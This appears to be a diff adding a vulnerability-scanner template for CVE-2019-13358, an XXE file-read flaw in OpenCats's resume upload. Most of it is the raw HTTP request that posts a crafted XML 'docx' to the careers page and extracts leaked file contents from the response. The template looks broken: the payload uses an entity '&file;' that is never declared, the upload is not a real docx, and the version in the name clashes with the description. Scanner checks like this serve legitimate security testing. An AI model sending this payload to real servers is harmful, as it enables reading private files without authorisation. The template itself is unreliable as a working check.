@@ -1,0 +1,58 @@
+id: CVE-2019-13358
+
+info:
+  name: OpenCats 9.4.2 XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    OpenCats before 0.9.4-3 has an XXE vulnerability in lib/DocumentToText.php. This allows remote attackers to read arbitrary files from the underlying operating system by uploading a crafted docx or odt file.
+  reference:
+    - https://www.exploit-db.com/exploits/50316
+
+http:
+  - raw:
+      - |
+        POST /careers/index.php?m=careers&p=onApplyToJobOrder HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEUTPcpptUlwBmr7W
+
+        ------WebKitFormBoundaryEUTPcpptUlwBmr7W
+        Content-Disposition: form-data; name="ID"
+
+        1
+        ------WebKitFormBoundaryEUTPcpptUlwBmr7W
+        Content-Disposition: form-data; name="candidateID"
+
+        -1
+        ------WebKitFormBoundaryEUTPcpptUlwBmr7W
+        Content-Disposition: form-data; name="applyToJobSubAction"
+
+        resumeLoad
+        ------WebKitFormBoundaryEUTPcpptUlwBmr7W
+        Content-Disposition: form-data; name="resumeFile"; filename="resume.docx"
+        Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
+
+        <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+        <w:body>
+        <w:p>
+        <w:r>
+        <w:t>START&file;END</w:t>
+        </w:r>
+        </w:p>
+        </w:body>
+        </w:document>
+        ------WebKitFormBoundaryEUTPcpptUlwBmr7W--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "START"
+          - "END"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "START(.*?)END"
